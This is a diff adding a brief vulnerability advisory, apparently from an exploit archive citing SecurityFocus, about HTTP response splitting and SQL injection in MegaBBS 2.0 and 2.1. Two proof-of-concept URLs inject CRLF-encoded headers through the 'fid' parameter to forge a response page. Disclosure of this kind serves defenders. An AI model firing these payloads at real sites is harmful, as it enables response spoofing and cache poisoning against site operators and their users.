@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/11253/info
+
+MegaBBS is reported prone to multiple vulnerabilities. These issues exist due to insufficient sanitization of user-supplied data and may allow an attacker to carry out HTTP response splitting and SQL injection attacks.
+
+MegaBBS versions 2.0 and 2.1 are reported prone to these issues.
+
+http://www.example.com/megabbs/forums/thread-post.asp?action=writenew&fid=%0
+d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.0%20200%20OK%0d%0aContent-Type:%20
+text/html%0d%0aContent-Length:%2033%0d%0a%0d%0a%3chtml%3eScanned%20by%20Maxp
+atrol%3c/html%3e%0d%0a&tid=4924&replyto=22947&displaytype=flat
+
+http://www.example.com/megabbs/forums/thread-post.asp?fid=%0d%0aContent-Leng
+th:%200%0d%0a%0d%0aHTTP/1.0%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aC
+ontent-Length:%2033%0d%0a%0d%0a%3chtml%3eScanned%20by%20Maxpatrol%3c/html%3e
+%0d%0a&action=writenew&displaytype=flat
